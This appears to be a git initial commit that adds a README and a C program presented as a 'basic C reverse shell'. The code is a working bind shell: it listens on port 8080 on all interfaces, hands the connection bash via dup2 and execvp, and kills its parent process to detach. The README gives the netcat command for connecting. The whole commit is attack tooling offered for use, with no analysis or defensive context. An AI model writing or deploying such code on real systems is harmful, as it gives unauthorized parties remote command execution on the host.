6fc7a28d2dbd7eb3f4d29cafea56d6f9ffbb252c
Fanda Burkon <fanda@ns98341.hicoria.cloud>
2022-04-13 19:52:59 +0000

    Initial commit

---
+++ README.md
@@ -0,0 +1,6 @@
+# Basic C reverse shell
+
+Connect using netcat
+On Linux:
+- nc ipaddress port
+Replace ipaddress with server IP and port with server port
---
+++ main.c
@@ -0,0 +1,44 @@
+#include <sys/socket.h>
+#include <unistd.h>
+#include <string.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+int main() {
+
+    pid_t pid = fork();
+
+    if (pid == 0) {
+
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        struct sockaddr_in serveraddr;
+
+        serveraddr.sin_family = AF_INET;
+        serveraddr.sin_port = htons(8080);
+        serveraddr.sin_addr.s_addr = INADDR_ANY;
+
+        bind(sock, (struct sockaddr*)&serveraddr, sizeof(serveraddr));
+
+        listen(sock, 5);
+
+        int client_sock = accept(sock, NULL, NULL);
+
+	dup2(client_sock, 0);
+	dup2(client_sock, 1);
+	dup2(client_sock, 2);
+
+	char* const args[] = {"/bin/bash", NULL};
+
+	kill(getppid(), 9);
+
+	execvp("/bin/bash", args);
+
+    } else wait(0);
+
+    return 0;
+}
